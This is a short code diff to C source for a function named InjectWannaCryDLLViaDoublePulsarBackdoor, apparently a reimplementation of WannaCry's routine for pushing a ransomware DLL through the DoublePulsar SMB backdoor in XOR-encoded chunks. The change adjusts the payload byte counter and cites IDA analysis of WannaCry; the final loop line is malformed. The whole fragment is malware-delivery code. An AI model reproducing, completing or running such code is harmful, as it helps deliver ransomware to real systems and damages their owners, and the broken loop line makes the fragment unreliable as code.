@@ -264,7 +264,10 @@ int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int
 	unsigned int xor_payload_size = 0x507308 ^ xkey; 
 	unsigned int chunk_size = 4096 ^ xkey; //chunk size but encrypted with XOR key
 	unsigned int o_offset = 0 ^ xkey; //offset counter but encrypted with XOR key
-	unsigned int bytesLeft = xor_payload_size; //Bytes Left counter
+	unsigned int bytesLeft = (shellcode_payload_size + DLLSize); //Bytes Left counter
+	//WILL verify why wannacry in IDA says: shellcode_payload_size + DLLSize + 12
+	//OR use this:
+	//unsigned int bytesLeft = sizeof(hMem)/sizeof(hMem[0]);
 	if(total_size / 4096 > 0)
 	{
 		for(i=0; ctx=i)
